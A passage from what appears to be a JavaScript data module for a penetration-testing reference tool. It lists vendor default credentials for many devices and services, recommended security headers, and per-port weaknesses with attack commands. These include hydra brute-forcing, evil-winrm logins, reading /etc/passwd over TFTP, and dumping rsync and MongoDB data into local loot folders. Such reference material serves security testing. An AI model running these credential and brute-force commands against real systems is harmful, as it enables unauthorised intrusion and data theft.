  { service: "MSSQL", username: "sa", password: "Password123!" },
  { service: "Oracle DB", username: "SYS", password: "CHANGE_ON_INSTALL" },
  { service: "Oracle DB", username: "SYSTEM", password: "MANAGER" },
  { service: "Oracle DB", username: "SCOTT", password: "TIGER" },
  { service: "Redis", username: "", password: "" },
  { service: "CouchDB", username: "admin", password: "admin" },
  { service: "Cassandra", username: "cassandra", password: "cassandra" },
  { service: "Elasticsearch", username: "elastic", password: "changeme" },
  { service: "InfluxDB", username: "admin", password: "admin" },
  { service: "Neo4j", username: "neo4j", password: "neo4j" },
  { service: "Memcached", username: "", password: "" },

  // -- Remote Access / Management --
  { service: "SSH (Raspberry Pi)", username: "pi", password: "raspberry" },
  { service: "SSH (Ubuntu)", username: "ubuntu", password: "ubuntu" },
  { service: "SSH (Vagrant)", username: "vagrant", password: "vagrant" },
  { service: "SSH (Kali Linux)", username: "kali", password: "kali" },
  { service: "VNC", username: "", password: "password" },
  { service: "VNC (RealVNC)", username: "", password: "" },
  { service: "TeamViewer", username: "", password: "(displayed on screen)" },
  { service: "RDP (Windows)", username: "Administrator", password: "" },
  { service: "Telnet (Various)", username: "admin", password: "admin" },
  { service: "IPMI/BMC", username: "ADMIN", password: "ADMIN" },
  { service: "iDRAC (Dell)", username: "root", password: "calvin" },
  { service: "iLO (HP)", username: "Administrator", password: "(on tag)" },
  { service: "IMM (Lenovo)", username: "USERID", password: "PASSW0RD" },
  { service: "CIMC (Cisco UCS)", username: "admin", password: "password" },

  // -- IoT / Embedded --
  { service: "Hikvision Camera", username: "admin", password: "12345" },
  { service: "Dahua Camera", username: "admin", password: "admin" },
  { service: "Axis Camera", username: "root", password: "pass" },
  { service: "Samsung DVR", username: "admin", password: "4321" },
  { service: "Bosch Camera", username: "service", password: "service" },
  { service: "Mobotix Camera", username: "admin", password: "meinsm" },
  { service: "Grandstream Phone", username: "admin", password: "admin" },
  { service: "Polycom Phone", username: "Polycom", password: "456" },
  { service: "Yealink Phone", username: "admin", password: "admin" },

  // -- CI/CD and DevOps --
  { service: "Jenkins", username: "admin", password: "admin" },
  { service: "Jenkins", username: "admin", password: "password" },
  { service: "GitLab", username: "root", password: "5iveL!fe" },
  { service: "Gitea", username: "admin", password: "admin" },
  { service: "SonarQube", username: "admin", password: "admin" },
  { service: "Nexus Repository", username: "admin", password: "admin123" },
  { service: "Artifactory", username: "admin", password: "password" },
  { service: "Grafana", username: "admin", password: "admin" },
  { service: "Kibana", username: "elastic", password: "changeme" },
  { service: "Portainer", username: "admin", password: "admin" },
  { service: "Rancher", username: "admin", password: "admin" },
  { service: "Harbor", username: "admin", password: "Harbor12345" },
  { service: "ArgoCD", username: "admin", password: "(auto-generated, stored in argocd-initial-admin-secret)" },

  // -- Network Management / Monitoring --
  { service: "Nagios", username: "nagiosadmin", password: "nagiosadmin" },
  { service: "Nagios", username: "nagiosadmin", password: "nagios" },
  { service: "Zabbix", username: "Admin", password: "zabbix" },
  { service: "PRTG", username: "prtgadmin", password: "prtgadmin" },
  { service: "Cacti", username: "admin", password: "admin" },
  { service: "LibreNMS", username: "admin", password: "admin" },
  { service: "Splunk", username: "admin", password: "changeme" },
  { service: "Graylog", username: "admin", password: "admin" },
  { service: "ManageEngine", username: "admin", password: "admin" },
  { service: "SNMP (v1/v2c)", username: "", password: "public" },
  { service: "SNMP (v1/v2c) write", username: "", password: "private" },

  // -- Virtualization --
  { service: "VMware ESXi", username: "root", password: "vmware" },
  { service: "VMware vCenter", username: "administrator@vsphere.local", password: "VMware1!" },
  { service: "Proxmox VE", username: "root", password: "(set during install)" },
  { service: "Hyper-V", username: "Administrator", password: "(Windows admin password)" },
  { service: "oVirt/RHEV", username: "admin@internal", password: "admin" },
  { service: "Citrix XenServer", username: "root", password: "(set during install)" },

  // -- Email Servers --
  { service: "Zimbra", username: "admin", password: "(set during install)" },
  { service: "hMailServer", username: "Administrator", password: "" },
  { service: "Roundcube", username: "admin", password: "admin" },
  { service: "SquirrelMail", username: "admin", password: "admin" },

  // -- Printers --
  { service: "HP Printer", username: "admin", password: "" },
  { service: "HP Printer (EWS)", username: "admin", password: "admin" },
  { service: "Brother Printer", username: "admin", password: "access" },
  { service: "Xerox Printer", username: "admin", password: "1111" },
  { service: "Canon Printer", username: "ADMIN", password: "canon" },
  { service: "Epson Printer", username: "admin", password: "admin" },
  { service: "Ricoh Printer", username: "admin", password: "" },
  { service: "Konica Minolta", username: "admin", password: "1234567812345678" },
  { service: "Lexmark Printer", username: "admin", password: "" },

  // -- Application Servers --
  { service: "Apache Tomcat", username: "tomcat", password: "tomcat" },
  { service: "Apache Tomcat", username: "admin", password: "admin" },
  { service: "Apache Tomcat", username: "tomcat", password: "s3cret" },
  { service: "JBoss/WildFly", username: "admin", password: "admin" },
  { service: "GlassFish", username: "admin", password: "admin" },
  { service: "WebLogic", username: "weblogic", password: "weblogic1" },
  { service: "WebLogic", username: "weblogic", password: "welcome1" },
  { service: "WebSphere", username: "admin", password: "admin" },
];

// ---------------------------------------------------------------------------
// 9. SECURITY HEADERS (15+ headers)
// ---------------------------------------------------------------------------

const SECURITY_HEADERS = [
  { name: "Strict-Transport-Security", recommended: "max-age=31536000; includeSubDomains; preload", description: "Enforces HTTPS connections to the server, preventing protocol downgrade attacks and cookie hijacking. The browser will automatically convert all HTTP requests to HTTPS for the specified duration.", impact: "Prevents SSL stripping attacks, MITM downgrade attacks, and insecure cookie transmission over HTTP" },
  { name: "Content-Security-Policy", recommended: "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self'; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'", description: "Controls which resources the browser is allowed to load for a given page, providing a strong defense against XSS and data injection attacks. Requires careful tuning to avoid breaking functionality.", impact: "Mitigates XSS, clickjacking, code injection, and data exfiltration attacks; most impactful single security header" },
  { name: "X-Content-Type-Options", recommended: "nosniff", description: "Prevents browsers from MIME-sniffing a response away from the declared Content-Type, which can prevent XSS attacks through content type confusion.", impact: "Prevents MIME-type confusion attacks where browsers interpret files as different content types than declared" },
  { name: "X-Frame-Options", recommended: "DENY", description: "Indicates whether a browser should be allowed to render a page in a frame, iframe, embed, or object. DENY prevents all framing; SAMEORIGIN allows framing by the same origin.", impact: "Prevents clickjacking attacks by controlling whether the page can be embedded in frames" },
  { name: "X-XSS-Protection", recommended: "0", description: "Legacy header for IE/Chrome XSS Auditor. Modern recommendation is to set to 0 (disabled) as the auditor can introduce vulnerabilities and CSP provides better protection.", impact: "The XSS Auditor has been removed from modern browsers; keeping it enabled can cause information leakage in older browsers" },
  { name: "Referrer-Policy", recommended: "strict-origin-when-cross-origin", description: "Controls how much referrer information is included with requests. Prevents leaking sensitive URL paths and query parameters to external sites.", impact: "Prevents leakage of sensitive data in URLs (tokens, session IDs, internal paths) through the Referer header" },
  { name: "Permissions-Policy", recommended: "accelerometer=(), camera=(), geolocation=(), gyroscope=(), magnetometer=(), microphone=(), payment=(), usb=()", description: "Controls which browser features and APIs can be used in the document or iframe. Replaces the older Feature-Policy header.", impact: "Restricts access to sensitive browser APIs reducing attack surface from XSS and third-party script abuse" },
  { name: "Cache-Control", recommended: "no-store, no-cache, must-revalidate, private", description: "Directs caching behavior for sensitive pages. Using no-store prevents browsers and proxies from caching responses containing sensitive data.", impact: "Prevents caching of sensitive data on shared computers, proxy servers, and CDN edge nodes" },
  { name: "Cross-Origin-Embedder-Policy", recommended: "require-corp", description: "Prevents a document from loading any cross-origin resources that do not explicitly grant the document permission. Required for SharedArrayBuffer and high-resolution timers.", impact: "Mitigates Spectre-like side-channel attacks by ensuring cross-origin isolation" },
  { name: "Cross-Origin-Opener-Policy", recommended: "same-origin", description: "Ensures a top-level document does not share a browsing context group with cross-origin documents, isolating it from potential cross-origin attacks.", impact: "Prevents cross-origin window references and Spectre-like attacks; enables cross-origin isolation" },
  { name: "Cross-Origin-Resource-Policy", recommended: "same-origin", description: "Indicates whether the browser should block no-cors cross-origin/cross-site requests to the given resource.", impact: "Prevents resources from being loaded by other origins, protecting against Spectre and data leakage" },
  { name: "X-Permitted-Cross-Domain-Policies", recommended: "none", description: "Controls whether Flash and Adobe Acrobat can load data from the domain via crossdomain.xml files.", impact: "Prevents Flash/PDF-based cross-domain data loading attacks" },
  { name: "Clear-Site-Data", recommended: "\"cache\",\"cookies\",\"storage\"", description: "Instructs the browser to clear browsing data (cache, cookies, storage) associated with the requesting origin. Useful on logout endpoints.", impact: "Ensures complete session cleanup on logout, preventing session reuse and cached credential access" },
  { name: "X-DNS-Prefetch-Control", recommended: "off", description: "Controls browser DNS prefetching. When enabled, the browser preemptively resolves domain names for links on the page, which can leak browsing activity.", impact: "Prevents DNS prefetch leakage that could reveal which links are present on sensitive pages" },
  { name: "Expect-CT", recommended: "max-age=86400, enforce", description: "Allows sites to opt in to reporting and enforcement of Certificate Transparency requirements, helping to detect misissued certificates.", impact: "Detects and prevents use of misissued TLS certificates (note: being deprecated in favor of built-in CT enforcement)" },
  { name: "Set-Cookie (Secure flags)", recommended: "Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600", description: "Cookie security attributes control how cookies are transmitted and accessed. Secure ensures HTTPS-only; HttpOnly prevents JavaScript access; SameSite controls cross-origin sending.", impact: "Prevents session hijacking via XSS (HttpOnly), network interception (Secure), and CSRF attacks (SameSite)" },
  { name: "Access-Control-Allow-Origin", recommended: "(specific origins, never wildcard with credentials)", description: "Specifies which origins can access the resource in cross-origin requests. Must be carefully configured to prevent unauthorized cross-origin data access.", impact: "Misconfiguration allows cross-origin data theft; wildcard with credentials is a critical vulnerability" },
];

// ---------------------------------------------------------------------------
// 10. PORT VULNERABILITIES (50+ ports)
// ---------------------------------------------------------------------------

const PORT_VULNS = [
  { port: 21, service: "FTP", vulns: ["Anonymous login", "Cleartext credentials", "Bounce attack", "Directory traversal", "Known CVEs (ProFTPD, vsftpd)"], commands: ["nmap -sV -p 21 --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor target", "ftp target (try anonymous:anonymous)", "hydra -l admin -P passwords.txt ftp://target"] },
  { port: 22, service: "SSH", vulns: ["Weak passwords", "Outdated versions", "Key-based auth misconfig", "Username enumeration (CVE-2018-15473)", "Algorithm downgrade"], commands: ["nmap -sV -p 22 --script ssh-auth-methods,ssh-hostkey,ssh2-enum-algos target", "hydra -l root -P passwords.txt ssh://target", "ssh-audit target"] },
  { port: 23, service: "Telnet", vulns: ["Cleartext credentials", "No encryption", "Default credentials", "Banner grabbing", "Brute force"], commands: ["nmap -sV -p 23 --script telnet-brute,telnet-ntlm-info target", "telnet target", "hydra -l admin -P passwords.txt telnet://target"] },
  { port: 25, service: "SMTP", vulns: ["Open relay", "User enumeration (VRFY/EXPN)", "Email spoofing", "Cleartext auth", "Known CVEs"], commands: ["nmap -sV -p 25 --script smtp-commands,smtp-enum-users,smtp-open-relay,smtp-vuln-cve2010-4344 target", "smtp-user-enum -M VRFY -U users.txt -t target"] },
  { port: 53, service: "DNS", vulns: ["Zone transfer", "Cache poisoning", "DNS amplification", "Subdomain enumeration", "DNS tunneling"], commands: ["dig axfr @target domain.com", "nmap -sV -p 53 --script dns-zone-transfer,dns-cache-snoop target", "dnsrecon -d domain.com -t axfr"] },
  { port: 67, service: "DHCP", vulns: ["Rogue DHCP server", "DHCP starvation", "DHCP spoofing"], commands: ["nmap -sU -p 67 --script dhcp-discover target", "dhcpig (DHCP starvation tool)"] },
  { port: 69, service: "TFTP", vulns: ["No authentication", "Directory traversal", "Information disclosure"], commands: ["nmap -sU -p 69 --script tftp-enum target", "tftp target (get /etc/passwd)"] },
  { port: 79, service: "Finger", vulns: ["User enumeration", "Information disclosure", "Remote command execution"], commands: ["finger @target", "finger admin@target", "nmap -sV -p 79 --script finger target"] },
  { port: 80, service: "HTTP", vulns: ["All web vulnerabilities", "Default pages", "Directory listing", "Information disclosure", "Misconfigurations"], commands: ["nikto -h http://target", "gobuster dir -u http://target -w wordlist.txt", "nmap -sV -p 80 --script http-enum,http-headers,http-methods target"] },
  { port: 88, service: "Kerberos", vulns: ["Kerberoasting", "AS-REP Roasting", "Golden/Silver ticket", "Pass-the-Ticket", "Brute force"], commands: ["nmap -sV -p 88 target", "kerbrute userenum -d domain.com users.txt --dc target", "GetUserSPNs.py domain/user:pass -dc-ip target -request"] },
  { port: 110, service: "POP3", vulns: ["Cleartext credentials", "Brute force", "Banner grabbing", "CVEs"], commands: ["nmap -sV -p 110 --script pop3-capabilities,pop3-brute target", "hydra -l user -P passwords.txt pop3://target"] },
  { port: 111, service: "RPCbind", vulns: ["Service enumeration", "NFS share discovery", "RPC service exploitation"], commands: ["rpcinfo -p target", "nmap -sV -p 111 --script rpc-grind,rpcinfo target"] },
  { port: 135, service: "MSRPC", vulns: ["RPC enumeration", "Service discovery", "DCOM exploitation"], commands: ["rpcclient -U '' -N target", "nmap -sV -p 135 --script msrpc-enum target", "impacket-rpcdump target"] },
  { port: 137, service: "NetBIOS-NS", vulns: ["Name enumeration", "Network discovery", "Information disclosure"], commands: ["nbtscan target/24", "nmap -sU -p 137 --script nbstat target", "nmblookup -A target"] },
  { port: 139, service: "NetBIOS-SSN", vulns: ["SMB relay", "Null session", "Share enumeration", "EternalBlue"], commands: ["enum4linux -a target", "smbclient -L //target -N", "nmap -p 139 --script smb-enum-shares,smb-vuln-ms17-010 target"] },
  { port: 143, service: "IMAP", vulns: ["Cleartext credentials", "Brute force", "Banner grabbing"], commands: ["nmap -sV -p 143 --script imap-capabilities,imap-brute target", "hydra -l user -P passwords.txt imap://target"] },
  { port: 161, service: "SNMP", vulns: ["Default community strings", "Information disclosure", "Configuration download", "Write access"], commands: ["snmpwalk -v2c -c public target", "onesixtyone -c community.txt target", "nmap -sU -p 161 --script snmp-info,snmp-brute target"] },
  { port: 389, service: "LDAP", vulns: ["Anonymous bind", "LDAP injection", "Information disclosure", "Cleartext credentials"], commands: ["ldapsearch -x -h target -b 'dc=domain,dc=com'", "nmap -sV -p 389 --script ldap-rootdse,ldap-search target"] },
  { port: 443, service: "HTTPS", vulns: ["SSL/TLS vulnerabilities", "Certificate issues", "All web vulnerabilities", "HSTS bypass"], commands: ["testssl.sh target:443", "sslyze target", "nmap -sV -p 443 --script ssl-enum-ciphers,ssl-heartbleed,http-enum target"] },
  { port: 445, service: "SMB", vulns: ["EternalBlue (MS17-010)", "Null session", "SMB relay", "Share enumeration", "PrintNightmare"], commands: ["nmap -p 445 --script smb-vuln-ms17-010,smb-enum-shares,smb-enum-users target", "enum4linux -a target", "crackmapexec smb target"] },
  { port: 464, service: "Kerberos (kpasswd)", vulns: ["Password change manipulation", "Brute force"], commands: ["nmap -sV -p 464 target"] },
  { port: 500, service: "IKE/IPsec", vulns: ["Aggressive mode PSK", "Weak encryption", "IKE cracking"], commands: ["ike-scan target", "nmap -sU -p 500 --script ike-version target"] },
  { port: 512, service: "rexec", vulns: ["Remote command execution", "No encryption", "Weak authentication"], commands: ["rlogin -l root target", "nmap -sV -p 512-514 target"] },
  { port: 513, service: "rlogin", vulns: ["Trust relationship abuse", "No encryption", "rhosts exploitation"], commands: ["rlogin target -l root", "nmap -sV -p 513 target"] },
  { port: 514, service: "RSH/Syslog", vulns: ["Remote shell without encryption", "Log injection (syslog)"], commands: ["rsh target command", "nmap -sV -p 514 target"] },
  { port: 515, service: "LPD (Printer)", vulns: ["Print job manipulation", "Information disclosure", "File read via print queue"], commands: ["nmap -sV -p 515 --script lpd-vuln target"] },
  { port: 548, service: "AFP (Apple Filing)", vulns: ["Authentication bypass", "Information disclosure", "Brute force"], commands: ["nmap -sV -p 548 --script afp-showmount,afp-brute target"] },
  { port: 554, service: "RTSP", vulns: ["Default credentials", "Unauthorized streaming", "Information disclosure"], commands: ["nmap -sV -p 554 --script rtsp-url-brute target"] },
  { port: 623, service: "IPMI/BMC", vulns: ["Hash disclosure (RAKP)", "Default credentials", "Cipher zero auth bypass"], commands: ["nmap -sU -p 623 --script ipmi-brute,ipmi-cipher-zero,ipmi-version target", "ipmitool -I lanplus -H target -U admin -P admin chassis status"] },
  { port: 636, service: "LDAPS", vulns: ["SSL/TLS issues", "Same as LDAP but encrypted", "Certificate validation issues"], commands: ["nmap -sV -p 636 --script ssl-enum-ciphers target", "ldapsearch -x -H ldaps://target"] },
  { port: 873, service: "Rsync", vulns: ["Anonymous access", "Information disclosure", "File exfiltration"], commands: ["nmap -sV -p 873 --script rsync-list-modules target", "rsync rsync://target/", "rsync -av rsync://target/module /tmp/loot/"] },
  { port: 993, service: "IMAPS", vulns: ["Brute force", "SSL/TLS issues"], commands: ["nmap -sV -p 993 --script ssl-enum-ciphers,imap-brute target"] },
  { port: 995, service: "POP3S", vulns: ["Brute force", "SSL/TLS issues"], commands: ["nmap -sV -p 995 --script ssl-enum-ciphers,pop3-brute target"] },
  { port: 1080, service: "SOCKS Proxy", vulns: ["Open proxy", "Network pivoting", "Traffic tunneling"], commands: ["nmap -sV -p 1080 --script socks-open-proxy target", "curl --socks5 target:1080 http://ifconfig.me"] },
  { port: 1099, service: "Java RMI", vulns: ["Deserialization RCE", "Remote code execution", "Information disclosure"], commands: ["nmap -sV -p 1099 --script rmi-dumpregistry,rmi-vuln-classloader target", "java -jar rmg.jar enum target 1099"] },
  { port: 1433, service: "MSSQL", vulns: ["Default sa credentials", "xp_cmdshell RCE", "Brute force", "SQL injection"], commands: ["nmap -sV -p 1433 --script ms-sql-info,ms-sql-brute,ms-sql-empty-password target", "sqsh -S target -U sa -P password", "impacket-mssqlclient sa:password@target"] },
  { port: 1521, service: "Oracle DB", vulns: ["Default credentials (SYS/CHANGE_ON_INSTALL)", "TNS poisoning", "SQL injection"], commands: ["nmap -sV -p 1521 --script oracle-tns-version,oracle-brute target", "odat all -s target -p 1521"] },
  { port: 1723, service: "PPTP VPN", vulns: ["MS-CHAPv2 weakness", "GRE tunnel attacks"], commands: ["nmap -sV -p 1723 --script pptp-version target", "thc-pptp-bruter -u user -W passwords.txt target"] },
  { port: 2049, service: "NFS", vulns: ["Exported shares", "no_root_squash", "UID/GID spoofing"], commands: ["showmount -e target", "nmap -sV -p 2049 --script nfs-ls,nfs-showmount,nfs-statfs target", "mount -t nfs target:/share /mnt"] },
  { port: 3306, service: "MySQL", vulns: ["Default credentials", "Remote root login", "UDF exploitation", "CVEs"], commands: ["nmap -sV -p 3306 --script mysql-info,mysql-brute,mysql-empty-password target", "mysql -h target -u root -p", "hydra -l root -P passwords.txt mysql://target"] },
  { port: 3389, service: "RDP", vulns: ["BlueKeep (CVE-2019-0708)", "Brute force", "NLA bypass", "MITM"], commands: ["nmap -sV -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 target", "hydra -l admin -P passwords.txt rdp://target", "xfreerdp /v:target /u:admin /p:password"] },
  { port: 4443, service: "HTTPS (alt)", vulns: ["Web application vulnerabilities", "Management interfaces"], commands: ["nmap -sV -p 4443 target", "curl -k https://target:4443"] },
  { port: 5432, service: "PostgreSQL", vulns: ["Default credentials", "Trust authentication", "SQL injection", "Brute force"], commands: ["nmap -sV -p 5432 --script pgsql-brute target", "psql -h target -U postgres", "hydra -l postgres -P passwords.txt postgres://target"] },
  { port: 5900, service: "VNC", vulns: ["No authentication", "Weak passwords", "Brute force", "Screenshot capture"], commands: ["nmap -sV -p 5900 --script vnc-info,vnc-brute target", "vncviewer target", "hydra -s 5900 -P passwords.txt vnc://target"] },
  { port: 5985, service: "WinRM (HTTP)", vulns: ["Brute force", "Pass-the-Hash", "Remote code execution"], commands: ["evil-winrm -i target -u user -p password", "crackmapexec winrm target -u user -p password"] },
  { port: 5986, service: "WinRM (HTTPS)", vulns: ["Same as 5985 but encrypted", "SSL/TLS issues"], commands: ["evil-winrm -i target -u user -p password --ssl", "crackmapexec winrm target -u user -p password --ssl"] },
  { port: 6379, service: "Redis", vulns: ["No authentication", "SLAVEOF RCE", "Config write RCE", "Lua sandbox escape"], commands: ["redis-cli -h target info", "redis-cli -h target config get *", "nmap -sV -p 6379 --script redis-info target"] },
  { port: 6667, service: "IRC", vulns: ["Default passwords", "Backdoors (UnrealIRCd)", "Information disclosure"], commands: ["nmap -sV -p 6667 --script irc-info,irc-unrealircd-backdoor target"] },
  { port: 8080, service: "HTTP Proxy/Alt", vulns: ["Web application vulnerabilities", "Management interfaces (Tomcat)", "Open proxy"], commands: ["nikto -h http://target:8080", "nmap -sV -p 8080 --script http-open-proxy,http-enum target", "gobuster dir -u http://target:8080 -w wordlist.txt"] },
  { port: 8443, service: "HTTPS (alt)", vulns: ["Management console access", "SSL/TLS issues", "Default credentials"], commands: ["nmap -sV -p 8443 --script ssl-enum-ciphers,http-enum target", "curl -k https://target:8443"] },
  { port: 8888, service: "HTTP (alt)/Jupyter", vulns: ["Jupyter Notebook unauthenticated access", "Remote code execution"], commands: ["curl http://target:8888", "nmap -sV -p 8888 target"] },
  { port: 9090, service: "Prometheus/Cockpit", vulns: ["Unauthenticated access", "Information disclosure", "Metrics exfiltration"], commands: ["curl http://target:9090/metrics", "curl http://target:9090/api/v1/targets"] },
  { port: 9200, service: "Elasticsearch", vulns: ["No authentication", "Data exfiltration", "Remote code execution (Groovy scripting)"], commands: ["curl http://target:9200", "curl http://target:9200/_cat/indices", "nmap -sV -p 9200 --script http-elasticsearch-info target"] },
  { port: 11211, service: "Memcached", vulns: ["No authentication", "Data exfiltration", "DDoS amplification"], commands: ["echo 'stats' | nc target 11211", "nmap -sV -p 11211 --script memcached-info target"] },
  { port: 27017, service: "MongoDB", vulns: ["No authentication", "Remote access without auth", "Data exfiltration"], commands: ["mongosh --host target", "nmap -sV -p 27017 --script mongodb-info,mongodb-brute target", "mongodump --host target --out /tmp/dump/"] },
  { port: 50000, service: "SAP/Jenkins", vulns: ["SAP Management Console", "Jenkins CLI", "Remote code execution"], commands: ["nmap -sV -p 50000 target", "curl http://target:50000"] },
];


// ---------------------------------------------------------------------------
// Module exports
// ---------------------------------------------------------------------------

module.exports = {
  OWASP_TOP_10,
  ATTACK_PATTERNS,
  COMMON_VULNS,
  PENTEST_CHECKLIST,
  PRIVESC_LINUX,
  PRIVESC_WINDOWS,
  REVERSE_SHELLS,
  DEFAULT_CREDS,
  SECURITY_HEADERS,
  PORT_VULNS,
};
